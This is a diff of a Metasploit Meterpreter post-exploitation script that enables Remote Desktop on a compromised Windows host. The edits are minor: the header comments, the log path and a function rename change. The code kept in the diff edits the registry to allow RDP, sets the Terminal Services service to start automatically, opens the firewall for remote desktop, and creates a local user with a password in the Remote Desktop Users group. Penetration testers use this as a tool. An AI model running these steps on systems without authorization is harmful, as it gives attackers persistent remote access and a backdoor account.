@@ -1,12 +1,7 @@
 # $Id$
-#
-# Meterpreter script for enabling Remote Desktop on Windows 2003, Windows Vista
-# Windows 2008 and Windows XP targets using native windows commands.
-# Provided by Carlos Perez at carlos_perez[at]darkoperator.com
-# Support for German Systems added by L0rdAli3n debian5[at]web.de
-# Version: 0.1.2
-# Note: Port Forwarding option provided by Natron at natron[at]invisibledenizen.org
-#      We are still working in making this option more stable.
+# $Revision$
+# Author: Carlos Perez at carlos_perez[at]darkoperator.com
+#-------------------------------------------------------------------------------
 ################## Variable Declarations ##################
 
 session = client
@@ -15,7 +10,7 @@ host_name = client.sys.config.sysinfo['Computer']
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 
 # Create a directory for the logs
-logs = ::File.join(Msf::Config.log_directory, 'getgui', host_name + filenameinfo )
+logs = ::File.join(Msf::Config.log_directory,'scripts', 'getgui')
 
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
@@ -68,7 +63,7 @@ def enablerd()
 		if v == 1
 			print_status "\tRDP is disabled; enabling it ..."
 			registry_setvaldata(key,value,0,"REG_DWORD")
-			file_local_write2file(@dest,"reg setval -k \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" -v 'fDenyTSConnections' -d \"1\"")
+			file_local_write(@dest,"reg setval -k \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" -v 'fDenyTSConnections' -d \"1\"")
 		else
 			print_status "\tRDP is already enabled"
 		end
@@ -87,9 +82,9 @@ def enabletssrv()
 		if v2 != 2
 			print_status "\tThe Terminal Services service is not set to auto, changing it to auto ..."
 			service_change_startup("TermService","auto")
-			file_local_write2file(@dest,"execute -H -f cmd.exe -a \"/c sc config termservice start= disabled\"")
+			file_local_write(@dest,"execute -H -f cmd.exe -a \"/c sc config termservice start= disabled\"")
 			cmd_exec("sc start termservice")
-			file_local_write2file(@dest,"execute -H -f cmd.exe -a \"/c sc stop termservice\"")
+			file_local_write(@dest,"execute -H -f cmd.exe -a \"/c sc stop termservice\"")
 			
 		else
 			print_status "\tTerminal Services service is already set to auto"
@@ -97,7 +92,7 @@ def enabletssrv()
 		#Enabling Exception on the Firewall
 		print_status "\tOpening port in local firewall if necessary"
 		cmd_exec('netsh firewall set service type = remotedesktop mode = enable')
-		file_local_write2file(@dest,"execute -H -f cmd.exe -a \"/c 'netsh firewall set service type = remotedesktop mode = enable'")
+		file_local_write(@dest,"execute -H -f cmd.exe -a \"/c 'netsh firewall set service type = remotedesktop mode = enable'")
 	rescue::Exception => e
 		print_status("The following Error was encountered: #{e.class} #{e}")
 	end
@@ -123,7 +118,7 @@ def addrdpusr(session, username, password, lang)
 	print_status "\tAdding User: #{username} with Password: #{password}"
 	begin
 		cmd_exec("net user #{username} #{password} /add")
-		file_local_write2file(@dest,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
+		file_local_write(@dest,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
 		print_status "\tAdding User: #{username} to local group '#{rdu}'"
 		cmd_exec("net localgroup \"#{rdu}\" #{username} /add")
 		
